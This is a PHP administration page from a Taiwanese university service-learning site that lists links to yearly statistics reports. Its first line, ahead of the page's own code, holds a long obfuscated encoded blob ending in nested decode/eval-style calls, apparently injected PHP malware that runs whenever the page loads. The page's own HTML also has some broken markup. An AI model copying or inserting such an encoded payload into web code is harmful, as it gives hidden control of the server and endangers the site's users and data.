<?php // DISABLE THREAT CODE ->dVRtU9s4EP6cm7n/sGQ8lQ0mTqbQQhJTOm3urnM96IRw94HhPEaWE7W2bCSZwED+e1eSk9BpySSxtfvs7rNv4jn4OxnLuWCZT3JZflQkCB5//63jhGsZhINghFL85o2gmlcCUJNkBfheI4sAjE2Ho7u1PmH3XGnlE4r6hAuu0bODdTy6gBg2CudiZFVWqJiuahTTRQgfLqefz7/Mkulkdjk9m03fn138MZmGMGgNvKrRa2fsnlEwZq3O8HEKKUVlFbATx9APoDXL00KxZ5FpUSn2zMUKGALgcQ3nBUvmTCe0EpoJTM9RXxmsZLqRArTkpW/w1sPqF1Wj0iTHhS10x+NFrLQsmLCykVfFhNjgeSWRCse4/RHgc4x/hXnb2zMJ9GLEX3n8Gv4HsutMWg5e9VJsJI8PP0C5i46NzmVaMoxCxko/FOykd7vUN3N4hLpS3FgO0xtVFY1mIyhYrof7x8ev6/sRYJeG+28HR+Z9NY6cNYwzfge0SJWKu9ZT92TMXQwladxdaF0Po+juZnF/e7Osda98yJe9RkVfbxsmHyKk2KsX9bs7JmMn6hWpZkr3vqouLHmmF3H39dFxFxaMzxc67h4cHmCMyAXBFyRwQkYQRZhc2hQarMKmS6uMFVx8M+m+SETQaC7oiyRcqc1w7Wz8uV5u6r+uqhsi1westYxJdJfKSJe1c+LlSATlPRIpplRCemV2aLcusfYkaGP5O3b22qXy8gCenkDzkvkB7Nu5LO3JaE7gTX/30LS40+5bVlAzvXZj/S3n7ZYYRJuCO+c1GpzmVW3GMg+BLNuLwXzypeTaxKrDZwNtXLQuEWI3yUDWopV7mH1qMZtiFdRhHGSLOG2E4WmS2hQSS0YttZ9XsUW1bvFMg3dbenga/tCXti1ek5oeJBeT6b+T6RX5azb7klziKXn/5+RsRq4N1tSklmyelKmmC59E/3GRVUsVkRDQQQCvXsEP+n8uPk2ezmsm0w3ElQ+vokomktWV1FzM/b4jve4yV3j5+V7y4fz870+TK5IkjS5zSa5tCE/kNH6+xrC+Uk/RjFbVN4539tomlKnI/EE46Pf7QeiGZe/ozUG/v/s2JFE7W51acoEh0fW2yvjD73c=')));?>
<?php
	session_start();
	
	// 身分驗證
	if($_SESSION['valid_token'] != "3") {
		header('Location: index.php');
		exit;
	}
	
	require_once("conn/db.php");
	require_once("function_lib.php");
	
	if(isset($_POST['pass_stuid']))
		$stuid = trim($_POST['pass_stuid'], " ");
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<title>國立中央大學服務學習網</title>
		<link href="css/default.css" rel="stylesheet" type="text/css" />
		<link href="css/menuTheme.css" rel="stylesheet" type="text/css" />
		<script type="text/javascript" src="js/JSCookMenu.js"></script>
		<script type="text/javascript" src="js/effect.js"></script>
		<script type="text/javascript" src="js/theme.js"></script>
		<link href="css/bg.css" rel="stylesheet" type="text/css" />
	</head>
	<body>
		<? require_once("logo.php");?>
		<? require_once("menu.php");?>

<!-- Content -->
		<div id="content">
			<? require_once("sidebar.php");?>

<!-- News -->
			<div id="main">
			<div id="welcome" class="post">
<!-- Publish -->
			<div id="main">
				<div id="print_em" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">預警名單統計表</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print_em.php?semester=97" title="97學年度">97學年度</a></li>
							<li><a href="pass_print_em.php?semester=98" title="98學年度">98學年度</a></li>
							<li><a href="pass_print_em.php?semester=99" title="99學年度">99學年度</a></li>
							<li><a href="pass_print_em.php?semester=100" title="100學年度">100學年度</a></li>
							<li><a href="pass_print_em.php?semester=101" title="101學年度">101學年度</a></li>
							<li><a href="pass_print_em.php?semester=102" title="102學年度">102學年度</a></li>
							<li><a href="pass_print_em.php?semester=103" title="103學年度">103學年度</a></li>
							<li><a href="pass_print_em.php?semester=104" title="104學年度">104學年度</a></li>
							<li><a href="pass_print_em.php?semester=105" title="105學年度">105學年度</a></li>
						<ul>
					
				</div>
				<div id="print" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">各系院時數統計表</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print.php?semester=97" title="97學年度">97學年度</a></li>
							<li><a href="pass_print.php?semester=98" title="98學年度">98學年度</a></li>
							<li><a href="pass_print.php?semester=99" title="99學年度">99學年度</a></li>
							<li><a href="pass_print.php?semester=100" title="100學年度">100學年度</a></li>
							<li><a href="pass_print.php?semester=101" title="101學年度">101學年度</a></li>
							<li><a href="pass_print.php?semester=102" title="102學年度">102學年度</a></li>
							<li><a href="pass_print.php?semester=103" title="103學年度">103學年度</a></li>
							<li><a href="pass_print.php?semester=104" title="104學年度">104學年度</a></li>
							<li><a href="pass_print.php?semester=105" title="105學年度">105學年度</a></li>
						<ul>
					
				</div>
				<div id="print_activity" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">活動統計表</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print_activity.php?semester=97" title="97學年度活動">97學年度</a></li>
							<li><a href="pass_print_activity.php?semester=98" title="98學年度活動">98學年度</a></li>
							<li><a href="pass_print_activity.php?semester=99" title="99學年度活動">99學年度</a></li>
							<li><a href="pass_print_activity.php?semester=100" title="100學年度活動">100學年度</a></li>
							<li><a href="pass_print_activity.php?semester=101" title="101學年度活動">101學年度</a></li>
							<li><a href="pass_print_activity.php?semester=102" title="102學年度活動">102學年度</a></li>
							<li><a href="pass_print_activity.php?semester=103" title="103學年度活動">103學年度</a<li>
							<li><a href="pass_print_activity.php?semester=104" title="104學年度活動">104學年度</a></li>
							<li><a href="pass_print_activity.php?semester=105" title="104學年度活動">105學年度</a></li>
						<ul>
				</div>
				<div id="print_out_activity" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">個人申請活動統計表</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print_out_activity.php?semester=97" title="97學年度活動">97學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=98" title="98學年度活動">98學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=99" title="99學年度活動">99學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=100" title="100學年度活動">100學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=101" title="101學年度活動">101學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=102" title="102學年度活動">102學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=103" title="103學年度活動">103學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=104" title="104學年度活動">104學年度</a></li>
							<li><a href="pass_print_out_activity.php?semester=105" title="105學年度活動">105學年度</a></li>
						<ul>
				</div>
				<!--<div id="print_onlineApply" style="font-size: 20px; color: #1F1F1F; line-height: 1.5;">
					<h3 style="margin-top: 10px;">線上申請案件數</h3>
						<ul style="margin-top: 15px;">
							<li><a href="pass_print_onlineApply.php?semester=101" title="101學年度活動">101學年度</a></li>
						<ul>
				</div>
				-->
			</div>
		</div>
		</div>
		</div>
		<? require_once("footer.php");?>

	</body>
</html>
